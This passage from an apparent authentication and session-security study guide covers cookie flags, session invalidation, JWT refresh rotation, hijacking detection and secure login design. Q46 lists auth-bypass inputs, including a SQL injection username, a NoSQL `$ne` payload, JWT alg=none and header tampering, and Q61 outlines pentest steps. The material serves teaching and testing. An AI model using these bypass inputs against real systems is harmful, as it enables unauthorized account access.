| XSS attack | If no HttpOnly | If localStorage |
| CSRF attack | Yes | No (unless cookie) |
| Stateless | No | Yes |
| Revocation | Easy | Hard |
| Mobile apps | Awkward | Native |

**Cookies for:** Traditional web apps, server-rendered, CSRF mitigation, easy revocation.

**Tokens for:** SPAs, mobile apps, microservices, cross-domain APIs.

**Hybrid:** JWT in HttpOnly cookie - best of both worlds.

### Q34: Secure cookie flags
**A:**

**1. HttpOnly:** JS can't access cookie. Protects against XSS theft. `document.cookie` won't show it.

**2. Secure:** Only sent over HTTPS. Prevents network sniffing.

**3. SameSite:**
- **Strict:** NEVER sent cross-site (most secure)
- **Lax (default):** Sent in top-level navigation, not iframes/AJAX (good balance)
- **None:** Sent everywhere (requires Secure)

**4. Domain:** Without: current domain only. With `.example.com`: all subdomains.

**5. Path:** Cookie sent only for matching paths.

**6. Max-Age/Expires:** Without: session cookie. With: persistent.

**Recommended secure cookie:**
```
Set-Cookie: SESSION=abc;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Path=/;
            Max-Age=3600
```

### Q35: HTTP Basic Authentication
**A:**

**Format:**
```
Authorization: Basic <base64(username:password)>
```

Example: `admin:secret123` → `YWRtaW46c2VjcmV0MTIz`
```
Authorization: Basic YWRtaW46c2VjcmV0MTIz
```

**Browser handles:** Server returns 401 with `WWW-Authenticate: Basic realm="My App"` → browser shows dialog → user enters creds → browser caches and sends.

**Security concerns:**
1. **Base64 is NOT encryption** - Trivially decoded
2. **Sent on every request** - Constant exposure
3. **No logout mechanism** - Browser caches
4. **Poor UX** - Native dialog, can't be styled

**When acceptable:**
- Internal APIs (HTTPS only)
- Development/testing
- Server-to-server (no UX)
- Simple admin interfaces

**Never for:** Public-facing apps, high-security, normal UX expected.

**Better alternatives:** Bearer tokens, cookie sessions, OAuth/OIDC.

---

## SECTION B: SESSION MANAGEMENT (Q36-65)

### Q36: How to invalidate sessions properly
**A:**

**Scenarios and implementation:**

**1. User logout:**
```python
@app.route('/logout', methods=['POST'])
def logout():
    Session.objects.filter(id=session_id).delete()
    response.delete_cookie('SESSION')
```

**2. Password change - invalidate ALL sessions:**
```python
def change_password(user, new_password):
    user.password_hash = hash_password(new_password)
    user.save()
    Session.objects.filter(user=user).delete()
    RefreshToken.objects.filter(user=user).delete()
```

**3. Account compromise:**
```python
def lock_account(user, reason):
    user.is_active = False
    user.save()
    Session.objects.filter(user=user).delete()
    user.requires_password_reset = True
```

**4. Suspicious activity** - Impossible travel, multiple countries.

**5. Admin-initiated:**
```python
def admin_force_logout(target_user_id):
    Session.objects.filter(user_id=target_user_id).delete()
    log_admin_action(f"Forced logout for user {target_user_id}")
```

**6. Token blocklist (for JWT):**
```python
class TokenBlocklist:
    @classmethod
    def add(cls, token_jti, exp):
        redis.setex(f"blocklist:{token_jti}", exp - int(time.time()), "1")
    
    @classmethod
    def is_blocked(cls, token_jti):
        return redis.exists(f"blocklist:{token_jti}")
```

### Q37: Server-side vs client-side session storage
**A:**

**Server-side (traditional):**
```
Cookie: SESSION=abc123  (opaque ID)
Server lookup: sessions[abc123] → {user_id: 100, role: 'user', ...}
```

**Pros:** Easy invalidation, server controls data, small cookie, sensitive data safe.
**Cons:** Server stores state (scaling), DB/cache lookup per request.

**Storage:** Database (slow), Redis (fast), Memcached (fast).

**Client-side (JWT):**
```
Authorization: Bearer eyJ...
Decoded: {user_id: 100, role: 'user', exp: 1717000000}
```

**Pros:** Stateless, no lookup, microservices-friendly, mobile-native.
**Cons:** Hard to revoke, larger size, sensitive data exposed (signed not encrypted), refresh complexity.

**Hybrid (best):**
```python
# Short JWT (15 min) + long refresh token (server-side)
access_token = create_jwt(user_id=100, exp=15min)
refresh_token = secrets.token_urlsafe(32)
Session.objects.create(user=user, refresh_token=refresh_token)
```

### Q38: Concurrent session policies
**A:**

**Policy 1: Unlimited sessions** - Default. User on phone, laptop, tablet simultaneously. Convenience > security.

**Policy 2: Single session only** - Force logout of previous on new login.
```python
def login(user):
    Session.objects.filter(user=user).delete()
    return Session.objects.create(user=user, ...)
```
Max security, annoying for multi-device users.

**Policy 3: Limited concurrent (e.g., max 3):**
```python
def login(user):
    sessions = Session.objects.filter(user=user, is_active=True).order_by('last_activity')
    if sessions.count() >= 3:
        sessions.first().delete()  # Kick oldest
    return Session.objects.create(user=user, ...)
```

**Policy 4: Per-device-type limits** - Different limits for mobile/desktop/tablet.

**Policy 5: User-controlled** - Show all sessions, user manages.

### Q39: Detecting session hijacking
**A:**

**Detection signals:**

**1. IP address change:**
```python
def check_session_ip(session, request):
    if session.last_country != request.country:
        time_diff = datetime.now() - session.last_activity
        if time_diff < timedelta(minutes=30):
            return IMPOSSIBLE_TRAVEL
```

**2. User-Agent change** - Same person rarely switches browsers mid-session.

**3. Behavioral anomalies** - Speed of actions (bot vs human), mouse patterns, typing rhythm.

**4. Geographic impossibilities:**
```python
def detect_impossible_travel(session, request):
    distance = calculate_distance(session.last_location, request.geo)
    time_elapsed = (datetime.now() - session.last_activity).seconds / 3600
    if distance / time_elapsed > 800:  # mph
        return True
```

**5. Multiple concurrent activity** - Same session, different IPs simultaneously.

**6. Privilege escalation attempts** - Suddenly trying admin actions.

**Response actions:**
- **Low risk:** Log event, add to risk score
- **Medium:** Require re-auth, 2FA prompt, email notify
- **High:** Force logout, disable account, alert security team

### Q40: Complete session lifecycle
**A:**

**Login:**
```python
def login(username, password, request):
    user = User.objects.get(username=username)
    if not verify_password(password, user.hash):
        log_event(user, 'login_failed')
        raise AuthError()
    
    if user.has_2fa:
        return require_2fa_response(user)
    
    session = Session.objects.create(
        user=user,
        ip_address=request.ip,
        user_agent=request.user_agent,
        country=geoip_lookup(request.ip),
        last_activity=datetime.now()
    )
    
    response.set_cookie('SESSION', session.id,
        httponly=True, secure=True, samesite='Lax', max_age=86400)
    
    if is_new_device(user, request):
        send_email(user.email, "New device login")
    
    return response
```

**Activity middleware:**
```python
@middleware
def session_middleware(request):
    session = Session.objects.filter(id=session_id, is_active=True).first()
    if not session:
        return None
    
    # Absolute timeout
    if datetime.now() > session.created_at + timedelta(hours=24):
        session.delete(); return None
    
    # Idle timeout
    if datetime.now() > session.last_activity + timedelta(minutes=30):
        session.delete(); return None
    
    if check_session_anomalies(session, request):
        session.requires_reauth = True
    
    session.last_activity = datetime.now()
    session.save()
```

**Logout:**
```python
def logout(request):
    session = request.session
    log_event(session.user, 'logout')
    session.delete()
    response.delete_cookie('SESSION')
```

**Cleanup background job:**
```python
def cleanup_expired_sessions():
    Session.objects.filter(
        created_at__lt=datetime.now() - timedelta(hours=24)
    ).delete()
```

### Q41: Step-up authentication
**A:**

**Concept:** Require stronger auth for sensitive operations even within authenticated session.

**Examples needing step-up:** Password change, email change, financial transactions, account deletion, API key generation, 2FA setup, granting admin.

**Implementation:**
```python
class SessionStepUp:
    @classmethod
    def authenticate_step_up(cls, session, method='password'):
        session.step_up_at = datetime.now()
        session.step_up_method = method
        session.save()
    
    @classmethod
    def is_step_up_valid(cls, session, max_age_minutes=5):
        if not session.step_up_at:
            return False
        return datetime.now() - session.step_up_at < timedelta(minutes=max_age_minutes)

def require_step_up(method='password', max_age=5):
    def decorator(view):
        def wrapper(request, *args, **kwargs):
            if not SessionStepUp.is_step_up_valid(request.session, max_age):
                request.session['return_to'] = request.path
                return redirect('/step-up-auth')
            return view(request, *args, **kwargs)
        return wrapper
    return decorator

@require_step_up(method='password')
def change_password(request):
    # User already verified password recently
    ...

@require_step_up(method='2fa')
def withdraw_funds(request):
    # 2FA verified recently
    ...
```

**Risk-based step-up:** Match auth method to operation risk and current risk score.

### Q42: API authentication methods comparison
**A:**

**1. API Keys** - Simple, long-lived, easy to revoke. Compromise = full access. Best for: backend-to-backend.
```
Authorization: Bearer ak_live_abc123xyz
```

**2. JWT Tokens** - Self-contained, includes user/permissions, hard to revoke. Best for: microservices, mobile, SPAs.
```
Authorization: Bearer eyJhbGciOi...
```

**3. OAuth Access Tokens** - Standard protocol, scope-based, complex setup. Best for: public APIs, third-party.

**4. HMAC Signatures** - Request integrity, no replay, complex client. Best for: financial APIs, AWS.
```
Authorization: AWS4-HMAC-SHA256 Credential=AKIA.../...Signature=xyz
```

**5. Mutual TLS (mTLS)** - Highest security, both authenticated, complex deployment. Best for: enterprise integration.

**6. Basic Auth (HTTPS)** - Simple, universal, no expiration. Best for: development, internal tools.

### Q43: JWT vs session tokens
**A:**

| Aspect | Session Token | JWT |
|--------|--------------|-----|
| Storage | Server-side | Client-side |
| Lookup | DB/Redis call | None (decode) |
| Size | ~32 bytes | ~200-500 bytes |
| Revocation | Easy (delete) | Hard (blocklist) |
| Statelessness | No | Yes |
| Cross-domain | Limited | Easy |
| Performance | DB call | Instant |
| Microservices | Awkward | Natural |

**JWT structure:**
```
header.payload.signature

Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "100", "name": "John", "exp": 1717000000}
Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)
```

(Detailed JWT covered in Part 6.)

### Q44: "Remember me" with JWT - implementation
**A:**

**Pattern: Short access token + long refresh token**

```python
def login(username, password, remember_me=False):
    user = authenticate(username, password)
    
    # Short access token (15 min)
    access_token = jwt.encode({
        'sub': user.id,
        'exp': datetime.now() + timedelta(minutes=15)
    }, secret_key, algorithm='HS256')
    
    # Refresh token (DB-stored, longer)
    refresh_value = secrets.token_urlsafe(32)
    refresh_expires = datetime.now() + (
        timedelta(days=30) if remember_me else timedelta(hours=24)
    )
    
    RefreshToken.objects.create(
        user=user,
        token_hash=hash(refresh_value),
        expires_at=refresh_expires
    )
    
    return {'access_token': access_token, 'refresh_token': refresh_value}

def refresh(refresh_value):
    rt = RefreshToken.objects.filter(
        token_hash=hash(refresh_value),
        expires_at__gt=datetime.now(),
        revoked=False
    ).first()
    
    if not rt:
        raise InvalidToken()
    
    # Rotate: issue new pair, revoke old
    new_access = jwt.encode({...}, secret_key)
    new_refresh = secrets.token_urlsafe(32)
    RefreshToken.objects.create(user=rt.user, token_hash=hash(new_refresh))
    rt.revoked = True
    rt.save()
    
    return {'access_token': new_access, 'refresh_token': new_refresh}
```

### Q45: Common authentication implementation mistakes
**A:**

1. **Storing plaintext passwords** - Never
2. **Using MD5/SHA1** - Too fast for passwords
3. **No rate limiting on login** - Brute force possible
4. **Predictable session IDs** - `user_id + timestamp`
5. **Session IDs in URLs** - Logs, history, Referer leak
6. **Long-lived sessions** - 365 day max_age
7. **Not regenerating session on login** - Session fixation
8. **Returning sensitive info in responses** - password_hash exposed
9. **Username enumeration** - "User not found" vs "Wrong password"
10. **Insecure password reset** - Sequential tokens, no expiration
11. **No HTTPS** - Plaintext transmission
12. **Missing cookie flags** - No HttpOnly/Secure/SameSite
13. **SQL injection in login** - String concatenation
14. **Hardcoded credentials** - Admin passwords in code
15. **Logging passwords** - Sensitive data in logs

### Q46: Auth bypass techniques
**A:**

**1. SQL Injection:** `admin' --` in username
**2. NoSQL Injection:** `{"username": "admin", "password": {"$ne": null}}`
**3. Default credentials:** admin/admin, root/root
**4. Parameter pollution:** `?username=admin&username=&password=hacked`
**5. HTTP verb tampering:** PUT/HEAD/OPTIONS instead of POST
**6. Forced browsing:** `/admin/dashboard`, `/api/internal/users`
**7. Direct page access:** Some apps check auth on navigation but not direct URL
**8. JWT manipulation:** alg=none, RS256→HS256 confusion
**9. Cookie manipulation:** `role=user` → `role=admin`
**10. Header injection:** X-Forwarded-For, X-Original-URL: /admin
**11. Hidden parameters:** `?debug=true`, `?admin=1`, `?is_admin=true`
**12. Mass assignment:** Sending extra `role: admin` in registration
**13. Race conditions:** Login while password changing, simultaneous attempts
**14. Time-based bypass:** Maintenance window access
**15. Email confirmation bypass:** Unverified account access, modify "verified" flag

### Q47: Brute force protection layers
**A:**

**Layer 1: Account lockout (with caveats)** - Risk: DoS

**Layer 2: Rate limiting per IP:**
```python
@rate_limit(max=10, per=60, by='ip')
def login(): ...
```

**Layer 3: Rate limiting per username:**
```python
@rate_limit(max=5, per=300, by='username')
def login(): ...
```

**Layer 4: Progressive delays:**
```python
def calculate_delay(failed_attempts):
    return min(2 ** failed_attempts, 30)
```

**Layer 5: CAPTCHA** - After N failed attempts

**Layer 6: Behavioral analysis** - Detect bots (no mouse movement, sequential timing)

**Layer 7: Notification** - Email user after multiple failures

**Layer 8: IP reputation** - Threat intelligence check

**Layer 9: Geographic restrictions** - Block countries not operated in

**Layer 10: Strong passwords** - Even no protection, strong passwords resist

### Q48: Federated authentication
**A:**

**Federated auth** = Authentication across organizations/systems.

**Patterns:**

**1. SAML federation** - Company A's IdP trusted by Company B's SP.

**2. OAuth/OIDC federation** - "Sign in with Google/Microsoft/Apple/GitHub".

**3. SCIM provisioning** - User created in HR → auto-provisioned to Office 365, Slack, Salesforce. Deactivated in HR → disabled everywhere.

**OIDC implementation (Passport.js):**
```javascript
passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: '/auth/google/callback'
}, async (accessToken, refreshToken, profile, done) => {
    let user = await User.findOne({ googleId: profile.id });
    if (!user) {
        user = await User.create({
            googleId: profile.id,
            email: profile.emails[0].value,
            name: profile.displayName
        });
    }
    return done(null, user);
}));
```

**Risks:**
1. **IdP compromise** = All federated apps compromised (Okta breach 2022)
2. **Account linking attacks** - Linking attacker's social to victim's app account
3. **Email verification** - Email change in Google can hijack federated apps
4. **Open redirect** - Common OAuth issue

### Q49: Token rotation strategies
**A:**

**Why rotate:** Limit damage from theft, force periodic re-auth, detect token reuse.

**1. Time-based rotation:**
```python
def rotate_tokens(session):
    if datetime.now() - session.tokens_issued > timedelta(minutes=15):
        new_access = create_access_token(session.user)
        new_refresh = secrets.token_urlsafe(32)
        session.refresh_token.revoke()
        session.refresh_token = new_refresh
        session.tokens_issued = datetime.now()
        return new_access, new_refresh
```

**2. Use-based rotation - theft detection:**
```python
def use_refresh_token(old_refresh):
    rt = RefreshToken.objects.get(token_hash=hash(old_refresh))
    
    if rt.revoked or rt.expires_at < datetime.now():
        if rt.revoked:
            # Old token used after rotation = THEFT
            RefreshToken.objects.filter(user=rt.user).update(revoked=True)
            send_security_alert(rt.user)
        raise InvalidToken()
    
    new_access = create_access_token(rt.user)
    new_refresh = secrets.token_urlsafe(32)
    rt.revoked = True
    rt.save()
    
    RefreshToken.objects.create(user=rt.user, token_hash=hash(new_refresh))
    return new_access, new_refresh
```

**3. Family-based detection** - Group refresh tokens for same login session. Reuse of old token → revoke entire family.

### Q50: Secure client-side token storage
**A:**

**Ranked by security:**

**1. HttpOnly Cookie (most secure for browsers):**
```
Set-Cookie: AUTH=token; HttpOnly; Secure; SameSite=Strict
```
XSS can't read, auto-sent, CSRF protection via SameSite.

**2. In-memory (JS variable):**
```javascript
let token = null;
// Lost on refresh, XSS readable while open
```

**3. SessionStorage** - Cleared on tab close, XSS readable, per-tab.

**4. LocalStorage (least secure)** - Persists forever, XSS readable. Avoid for sensitive tokens.

**5. IndexedDB** - Like LocalStorage, better for large data, same XSS exposure.

**Best practice SPA pattern:**
```javascript
// Short-lived access in memory, refresh in HttpOnly cookie
let accessToken = null;

async function login(creds) {
    const res = await fetch('/api/login', {
        method: 'POST',
        body: JSON.stringify(creds),
        credentials: 'include'  // Receives refresh cookie
    });
    accessToken = (await res.json()).access_token;
}

async function apiCall(url) {
    return fetch(url, {
        headers: {'Authorization': `Bearer ${accessToken}`},
        credentials: 'include'
    });
}

async function refresh() {
    const res = await fetch('/api/refresh', {
        method: 'POST',
        credentials: 'include'  // Sends refresh cookie
    });
    accessToken = (await res.json()).access_token;
}
```

**Mobile:**
- iOS: Keychain (encrypted)
- Android: EncryptedSharedPreferences

### Q51: Session in microservices
**A:**

**Pattern 1: JWT throughout** - Each service verifies independently. Stateless, no central store.

**Pattern 2: Centralized session service:**
```python
# API Gateway middleware
def gateway_middleware(request):
    session = SessionService.get(request.cookies.get('SESSION'))
    if not session:
        return error(401)
    
    # Forward to backend with user info
    response = httpx.request(
        request.method,
        backend_url + request.path,
        headers={
            'X-User-Id': str(session.user_id),
            'X-User-Role': session.role,
            'X-Tenant-Id': session.tenant_id
        }
    )

# Backend trusts headers from gateway ONLY
def get_user(request):
    user_id = request.headers.get('X-User-Id')
    return User.objects.get(id=user_id)
```

**Critical:** Backend services must NEVER accept these headers directly from internet, only from gateway.

**Pattern 3: Service mesh with mTLS** - Istio/Linkerd handles service auth.

**Pattern 4: Token exchange** - Each service has own token with limited scope.

### Q52: Cookie-based auth security issues
**A:**

**1. Missing HttpOnly** - XSS steals session via `document.cookie`
**2. Missing Secure flag** - Cookie sent over HTTP, network sniffing
**3. Missing SameSite** - CSRF possible
**4. Overly broad domain** - `.example.com` allows subdomain takeover
**5. Long expiration** - 1 year max_age = stolen cookie usable forever
**6. No regeneration after login** - Session fixation
**7. Session not invalidated on logout** - Server still considers valid
**8. Cookie ID in URLs** - Logs, history, Referer leak
**9. JS-needed auth cookie** - Use split: auth (HttpOnly) + CSRF token (readable)
**10. Storing too much in cookie** - 4KB limit, use opaque ID + server-side data

### Q53: Testing for session vulnerabilities
**A:**

**Session testing checklist:**

**1. Token strength** - Burp Sequencer to analyze randomness (capture 100+ tokens)

**2. Session ID in URL** - Test if app accepts `?SESSION=abc`

**3. Session fixation:**
```
GET / Cookie: SESSION=user_set_value
POST /login Cookie: SESSION=user_set_value
# Check if same ID after login → fixation
```

**4. HttpOnly flag** - Browser console: `document.cookie` shouldn't show

**5. Secure flag** - Use HTTP, check if cookie sent (shouldn't be)

**6. SameSite flag** - DevTools → Application → Cookies

**7. Session timeout** - Login, wait 1 hour idle, try use

**8. Concurrent sessions** - Test policy

**9. Logout effectiveness** - Save cookie, logout, try use (should fail)

**10. Password change invalidation** - Save cookie, change pass, try use

**11. Session prediction** - Get multiple, look for patterns

**12. Cross-account** - Use user A's session for user B's resources

### Q54: Authentication logging and monitoring
**A:**

**What to log:**

**1. Login events:**
```json
{"event": "login", "user_id": 100, "ip": "1.2.3.4",
 "success": true, "method": "password", "country": "IN"}
```

**2. Failed logins** - Don't log passwords or valid usernames (PII)

**3. Account lockouts** - With reason and duration

**4. Password changes** - User initiated vs forced

**5. 2FA events** - Enabled, disabled, failed

**6. Suspicious activity** - New country, impossible travel

**7. Logout** - Duration, method (user/timeout/forced)

**What to monitor:**

1. **Failed login spikes** - >X failed/minute = credential stuffing
2. **Geographic anomalies** - New country logins
3. **Account lockout patterns** - Mass lockouts = stuffing
4. **Password reset abuse** - Multiple resets for same user
5. **Privileged account access** - Admin logins always noted

**Tools:** Splunk, Elastic Security, Azure AD Identity Protection, ELK + PagerDuty.

### Q55: GDPR/HIPAA/PCI authentication requirements
**A:**

**GDPR (EU):**
- Article 32 - Appropriate security measures
- Strong authentication (MFA for sensitive data)
- Access logging (Article 30)
- Right to erasure (delete on request)
- Data minimization (no unnecessary auth data)
- Breach notification (72 hours)
- Fines: Up to €20M or 4% revenue

**HIPAA (US healthcare):**
- Unique user identification
- Emergency access procedures
- Automatic logoff
- Encryption (transit and rest)
- Audit controls
- Multi-factor for remote access
- Penalties: $100-$50K per violation, $1.5M annual cap

**PCI-DSS (payment cards) - Requirement 8:**
- Unique IDs per user (no shared)
- Strong authentication
- Multi-factor for non-console admin
- Password complexity, 90-day rotation (though NIST disagrees)
- 15-minute idle timeout
- Account lockout (max 6 attempts, 30-min lockout)

**SOC 2:** Security, availability, integrity, confidentiality, privacy principles - includes auth controls.

---

## SECTION C: ADVANCED TOPICS & SCENARIOS (Q56-100)

### Q56: Biometric authentication
**A:**

**Types:**
1. **Fingerprint** - TouchID, Windows Hello, capacitive sensors
2. **Face** - FaceID, Windows Hello Face, Android
3. **Iris/Retina** - Highest accuracy, less common consumer
4. **Voice** - Banking phone services
5. **Behavioral** - Typing, mouse, gait analysis

**How it works:**
1. **Enrollment** - Sensor captures, extracts features (NOT full image), stores template encrypted on-device
2. **Authentication** - Live capture, extract features, compare to template
3. **Liveness detection** - Detect spoofing (photo, mask) via depth/IR sensors

**Pros:** Can't be forgotten, hard to share, convenient, strong factor.

**Cons:** Can't be changed if compromised, false positives/negatives, spoofing attacks.

**Security considerations:**

1. **Data storage** - Local only (Secure Enclave, TrustZone), never sent raw to server
2. **Liveness detection** - 2D face → 3D depth check
3. **FAR/FRR trade-off** - False Acceptance vs False Rejection
4. **Fallbacks** - PIN when biometric fails
5. **Legal** - Some jurisdictions: police can compel biometric (5th Amendment protects passwords in US)

### Q57: IoT authentication
**A:**

**Challenges:** Limited UI, constrained resources, power constraints, network limitations.

**Patterns:**

**1. Pre-shared keys** - Factory-installed, per-device. Risk: mass compromise.

**2. Certificate-based** - Per-device X.509 cert, better than shared keys.

**3. OAuth Device Flow** (Smart TVs, game consoles):
```
1. Device shows code "ABC-123"
2. User visits go to example.com/connect on phone
3. User enters code, authenticates
4. Device polls server, gets token
```

**4. QR code pairing** - Scan QR with phone, transfers credentials.

**5. Out-of-band** - Bluetooth pairing first, then WiFi credentials (Apple HomeKit, Google Home).

**Security issues:**
1. **Default credentials** - "admin/admin" on routers (Mirai botnet exploited)
2. **Hardcoded credentials** - Found in firmware analysis
3. **Insecure protocols** - HTTP, FTP, Telnet
4. **No update mechanism** - Auth flaws persist forever

**Best practices:** Unique factory creds, HTTPS, mutual TLS, forced password change first use, auto-updates, encryption at rest.

### Q58: API key management best practices
**A:**

**Generation:**
```python
api_key = "pk_live_" + secrets.token_urlsafe(32)
# Output: pk_live_vlHbJZkFb4xkXn8z2A_x4VKp...
```

**Format:** `prefix_env_random` for identification.

**Storage:**
```sql
CREATE TABLE api_keys (
    id UUID PRIMARY KEY,
    user_id INT,
    key_hash VARCHAR(64),    -- Only hash, never plain
    key_prefix VARCHAR(16),  -- For display
    permissions JSON,
    created_at TIMESTAMP,
    last_used_at TIMESTAMP,
    expires_at TIMESTAMP,
    revoked_at TIMESTAMP NULL
);
```

```python
def create_api_key(user, permissions):
    key = "pk_live_" + secrets.token_urlsafe(32)
    APIKey.objects.create(
        user=user,
        key_hash=hashlib.sha256(key.encode()).hexdigest(),
        key_prefix=key[:12] + "...",
        permissions=permissions,
        expires_at=datetime.now() + timedelta(days=365)
    )
    return key  # Show ONCE
```

**Verification:**
```python
def verify_api_key(provided_key):
    key_hash = hashlib.sha256(provided_key.encode()).hexdigest()
    return APIKey.objects.filter(
        key_hash=key_hash,
        revoked_at__isnull=True,
        expires_at__gt=datetime.now()
    ).first()
```

**Best practices:**
1. Hash storage, never plain
2. Show once at creation
3. Public prefix for identification
4. Expiration forcing rotation
5. Scope-limited permissions
6. Audit logging all usage
7. Rate limiting per key
8. IP allow-list option
9. Webhook on suspicious use
10. Easy revocation

### Q59: Authentication in mobile apps
**A:**

**1. Biometric authentication:**

iOS:
```swift
import LocalAuthentication
let context = LAContext()
context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
    localizedReason: "Unlock account") { success, error in
    if success { /* authenticated */ }
}
```

Android:
```kotlin
val biometricPrompt = BiometricPrompt(this, executor, callback)
val promptInfo = BiometricPrompt.PromptInfo.Builder()
    .setTitle("Biometric login")
    .setNegativeButtonText("Use password")
    .build()
biometricPrompt.authenticate(promptInfo)
```

**2. Secure token storage:**

iOS Keychain:
```swift
let keychain = Keychain(service: "com.app")
keychain["access_token"] = token
```

Android EncryptedSharedPreferences:
```kotlin
val sharedPreferences = EncryptedSharedPreferences.create(
    "tokens", masterKeyAlias, context,
    PrefKeyEncryptionScheme.AES256_SIV,
    PrefValueEncryptionScheme.AES256_GCM
)
```

**3. Certificate pinning** - Prevents MITM:
```kotlin
// OkHttp
val certificatePinner = CertificatePinner.Builder()
    .add("api.example.com", "sha256/AAAAAAAA...")
    .build()
```

**4. Jailbreak/Root detection** - Don't allow auth on compromised devices.

**5. App lock** - PIN/biometric to open app, auto-lock after backgrounding.

**6. OAuth in mobile** - Use App Auth pattern (SFSafariViewController on iOS, Chrome Custom Tabs on Android), NOT embedded WebView. Use PKCE.

### Q60: Smart home device auth case study
**A:**

**Setup flow:**

1. **Manufacturing** - Device has unique cert burned in, public key registered with cloud, private key in secure element

2. **User unboxing** - Plug in, device boots in setup mode

3. **Pairing with phone** - App scans via BLE, user confirms, app sends WiFi credentials

4. **Cloud registration** - Device authenticates to cloud with cert, registers to user account

5. **Ongoing operation** - Device ↔ Cloud via mTLS, user ↔ cloud via standard mobile auth

**Architecture:**
```
[User Phone] ←OAuth/JWT→ [Cloud Backend] ←mTLS→ [IoT Device]
```

**Common attacks:**

1. **Default credentials** - admin/admin (Mirai botnet)
2. **Insecure pairing** - Plain-text WiFi credentials
3. **Cloud account takeover** - Compromise cloud auth → control device
4. **Local interface vulns** - Web UI on device, SQLi, command injection
5. **Firmware updates** - Unsigned firmware = malware injection

**Defense:** Strong factory credentials, HTTPS everywhere, signed firmware, auto-updates, network segmentation, monitoring.

### Q61: Authentication pentesting methodology
**A:**

**Phase 1: Discovery** - All login endpoints, password reset, OAuth/SAML/SSO, session management

**Phase 2: Username enumeration** - Login/registration/reset response differences, timing attacks

**Phase 3: Password testing** - Default creds, common passwords, credential stuffing samples, name-based (john.doe / John2026)

**Phase 4: Brute force** - Rate limiting, account lockout, CAPTCHA effectiveness

**Phase 5: Password policy** - Min length, complexity, common password check, password history

**Phase 6: Session testing** - Token strength (Burp Sequencer), cookie flags, session fixation, timeout, logout

**Phase 7: 2FA testing** - Bypass attempts, TOTP brute force, backup code abuse

**Phase 8: OAuth testing** - Redirect URI validation, state parameter, open redirect, CSRF

**Phase 9: Password reset** - Token strength, reuse, expiration, host header injection

**Phase 10: Account management** - Email/phone change protection, account deletion, recovery

**Tools:** Burp Suite, Hydra, Burp Intruder, WebGoat, OWASP ZAP.

### Q62: Real-world authentication breaches
**A:**

**1. LinkedIn (2012, 2016)** - 117M + 167M credentials, SHA-1 no salt. Lesson: Hashing without salt useless against tables, SHA-1 too fast.

**2. Adobe (2013)** - 153M accounts, encrypted passwords (reversible!), hints exposed plain patterns. Lesson: Never encrypt passwords (one-way hash).

**3. Yahoo (2013-2014)** - 3 BILLION accounts, MD5. Lesson: MD5 broken in 2004, still used in 2014.

**4. Equifax (2017)** - 147M people. Apache Struts vuln + default admin credentials + no encryption. Lesson: Patches critical, internal systems need same security, defense in depth.

**5. T-Mobile (2021)** - 76M customers, API auth bypass. Lesson: API auth as important as web.

**6. Twitch (2021)** - Source code + payouts leak, hardcoded credentials in S3 misconfiguration. Lesson: Cloud config matters, credential management critical.

**7. Capital One (2019)** - 100M customers, SSRF + IAM misconfiguration, insider attacker. Lesson: Cloud IAM critical, insider threats real.

**Pattern:** Most breaches involve weak password storage, default/leaked credentials, missing MFA, improper access controls, outdated systems.

### Q63: Designing secure auth system from scratch
**A:**

**Principles:**
1. Defense in depth (strong passwords + MFA + rate limiting + anomaly detection + logging + IR)
2. Least privilege
3. Audit everything
4. Plan for breach

**Architecture:**
```
[Client] → [CDN/WAF] → [API Gateway] → [Auth Service]
                                          ↓
                                   [Identity Store]
                                          ↓
                                   [Token Issuance] ←→ [Token Store]
                                          ↓
                                [Application Services]
```

**Database design:**
```sql
CREATE TABLE users (
    id UUID PRIMARY KEY,
    email VARCHAR(255) UNIQUE,
    email_verified BOOLEAN DEFAULT FALSE,
    password_hash VARCHAR(255),
    password_changed_at TIMESTAMP,
    mfa_enabled BOOLEAN DEFAULT FALSE,
    totp_secret VARCHAR(64),
    backup_codes JSON,
    is_active BOOLEAN DEFAULT TRUE,
    locked_until TIMESTAMP,
    failed_login_count INT DEFAULT 0,
    created_at TIMESTAMP,
    last_login_at TIMESTAMP
);

CREATE TABLE sessions (
    id UUID PRIMARY KEY,
    user_id UUID REFERENCES users(id),
    refresh_token_hash VARCHAR(64),
    device_info JSON,
    ip_address INET,
    country VARCHAR(2),
    created_at TIMESTAMP,
    last_activity_at TIMESTAMP,
    expires_at TIMESTAMP,
    revoked_at TIMESTAMP NULL
);

CREATE TABLE auth_events (
    id BIGSERIAL PRIMARY KEY,
    user_id UUID REFERENCES users(id),
    event_type VARCHAR(50),
    success BOOLEAN,
    ip_address INET,
    metadata JSON,
    created_at TIMESTAMP DEFAULT NOW()
);
```

**Login flow:**
```python
def login(email, password, request):
    user = User.objects.filter(email=email).first()
    
    # Constant time (timing attack prevention)
    dummy_hash = "$argon2id$v=19$m=65536,t=3,p=4$..."
    if not user:
        verify_password(password, dummy_hash)
        return generic_error()
    
    if user.locked_until and user.locked_until > datetime.now():
        return locked_response()
    
    if not verify_password(password, user.password_hash):
        user.failed_login_count += 1
        if user.failed_login_count >= 5:
            user.locked_until = datetime.now() + timedelta(minutes=15)
        user.save()
        return generic_error()
    
    user.failed_login_count = 0
    user.save()
    
    if user.mfa_enabled:
        return require_mfa_response(user)
    
    session = create_session(user, request)
    return create_token_response(session)
```

### Q64: Secure password change implementation
**A:**

```python
@require_authentication
@require_step_up('password', max_age=5)
def change_password(request):
    current_password = request.form['current_password']
    new_password = request.form['new_password']
    confirm_password = request.form['confirm_password']
    user = request.user
    
    # 1. Verify current password
    if not verify_password(current_password, user.password_hash):
        log_auth_event(user, 'change_password_failed')
        return error("Current password incorrect")
    
    # 2. Confirm match
    if new_password != confirm_password:
        return error("Passwords don't match")
    
    # 3. Validate strength
    if not is_strong_password(new_password):
        return error("Password doesn't meet requirements")
    
    # 4. Check breached
    if is_breached_password(new_password):
        return error("Password in data breaches")
    
    # 5. Different from current
    if verify_password(new_password, user.password_hash):
        return error("Must be different from current")
    
    # 6. Check history (last 5)
    for old_hash in user.password_history[-5:]:
        if verify_password(new_password, old_hash):
            return error("Cannot reuse recent password")
    
    # 7. Update
    user.password_history.append(user.password_hash)
    user.password_history = user.password_history[-5:]
    user.password_hash = hash_password(new_password)
